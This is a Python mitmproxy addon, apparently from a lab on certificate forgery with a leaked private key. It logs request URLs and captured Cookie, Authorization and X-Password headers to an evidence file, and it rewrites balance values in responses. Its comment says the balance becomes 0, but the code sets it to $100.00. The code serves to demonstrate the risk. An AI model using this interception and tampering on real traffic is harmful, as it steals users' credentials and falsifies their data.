"""mitmproxy 插件：记录代理看到的请求行与敏感头，写入 evidence/mitm-plaintext.txt。

只有当客户端接受了代理"用泄露私钥现场签发"的伪造证书时，这里才会有内容——
这就是"中间人看到了明文"的直接证据。
"""
import os
from pathlib import Path

from mitmproxy import http

LOG = os.environ.get("MITM_LOG") or str(
    Path("/lab/evidence/mitm-plaintext.txt") if Path("/lab/evidence").exists()
    else Path(__file__).resolve().parent.parent.parent / "evidence" / "mitm-plaintext.txt")


def _write(line: str) -> None:
    os.makedirs(os.path.dirname(LOG), exist_ok=True)
    with open(LOG, "a", encoding="utf-8") as f:
        f.write(line + "\n")


def request(flow: http.HTTPFlow) -> None:
    _write(f">>> {flow.request.method} {flow.request.pretty_url}")
    for key in ("Cookie", "Authorization", "X-Password"):
        if key in flow.request.headers:
            _write(f"    {key}: {flow.request.headers[key][:80]}")


def response(flow: http.HTTPFlow) -> None:
    # 中间人改内容：把余额换成 0，证明"代理不仅看得到，还能改"
    text = flow.response.get_text()
    if text:
        tampered = text.replace("$0.00", "$100.00")
        if tampered != text:
            flow.response.set_text(tampered)
            _write("    (已改写响应中的余额)")
    _write(f"<<< {flow.response.status_code} {flow.request.pretty_url}")
